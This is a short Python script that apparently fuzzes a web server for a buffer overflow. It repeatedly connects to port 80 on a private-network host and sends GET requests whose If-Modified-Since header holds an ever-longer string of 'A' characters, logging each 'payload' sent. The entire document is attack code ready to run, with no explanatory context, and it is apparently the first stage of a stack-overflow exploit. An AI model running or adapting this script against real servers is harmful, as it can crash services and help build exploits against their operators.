import socket
import time

host = "192.168.17.129"

length = 10

while (length < 1000):

    buf = "A" * length

    header = (
            'GET / HTTP/1.1\r\n' \
            'If-Modified-Since: , %s\r\n\r\n') % (buf)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 80))
    print("[+] Connected, sending payload")
    s.send(bytes(header, 'utf8'))
    s.recv(1024)
    s.close()
    print("[+] Buffer sent: " + str(length))
    length += 10
